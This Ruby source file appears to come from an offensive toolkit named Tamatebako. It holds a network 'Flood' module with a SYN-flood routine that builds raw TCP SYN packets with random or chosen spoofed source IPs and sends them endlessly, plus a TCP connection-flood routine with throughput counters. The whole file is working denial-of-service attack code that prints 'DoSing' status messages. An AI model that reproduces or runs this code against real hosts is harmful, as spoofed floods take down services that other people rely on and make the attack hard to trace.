module Tamatebako
  module Network
    module Flood

      def syn_flood
        # host
        # port
        # source
        begin
          pack = Racket::Racket.new
          pack.l3 = Racket::L3::IPv4.new
          pack.l3.dst_ip = ip
          pack.l3.protocol = 6
          pack.l4 = Racket::L4::TCP.new
          pack.l4.src_port = rand(65535) + 1
          pack.l4.dst_port = port.to_i
          pack.l4.flag_syn = 1
          pack.l4.ack = 0
        rescue
          puts " Error building packet."
          puts ""
          exit
        end
        if randpackets == true
          Thread.new do
            puts "[*] DoSing #{ip} on port #{port}"
            loop do
              sleep(1)
              STDOUT.flush
              print "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (rand src) "
            end
          end
          begin
            loop do
              pack.l3.src_ip = "#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}"
              pack.l3.ttl = 128
              pack.l4.window = rand(4096) + 1
              pack.l4.src_port = rand(65535) + 1
              pack.l4.seq = 0
              pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
              pack.sendpacket
              spoofedsyn += 1
            end
          rescue
            puts ""
            puts " Error sending packets. Root?"
            puts ""
            exit
          end
        else
          Thread.new do
            puts "[*] DoSing #{ip} on port #{port}"
            loop do
              sleep(1)
              STDOUT.flush
              print "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (#{source}) "
            end
          end
          begin
            loop do
              pack.l3.src_ip = source
              pack.l3.ttl = 128
              pack.l4.window = rand(4096) + 1
              pack.l4.src_port = rand(65535) + 1
              pack.l4.seq = 0
              pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
              pack.sendpacket
              spoofedsyn += 1
            end
          rescue
            puts ""
            puts " Error sending packets. Root?"
            puts ""
            exit
          end
        end

      end

      def tcp_flood
        Thread.new do
          loop do
            begin
              # This number changes dramatically the power of the attack.
              Timeout::timeout(0.00001) do
                # Increases 2 because this code sends a SYN and then a RST (reset connection) packet,
                # this is caused by the Timeout.
                $number += 2
                # KBytes per second.
                # 74 bytes from the SYN and 54 from the RST.
                $bytes += 74 + 54
                $kbytes = $bytes/1024
                socket = TCPSocket.new(ip, port)
              end
            rescue Timeout::Error
            end
          end
        end

      end
    end
  end
end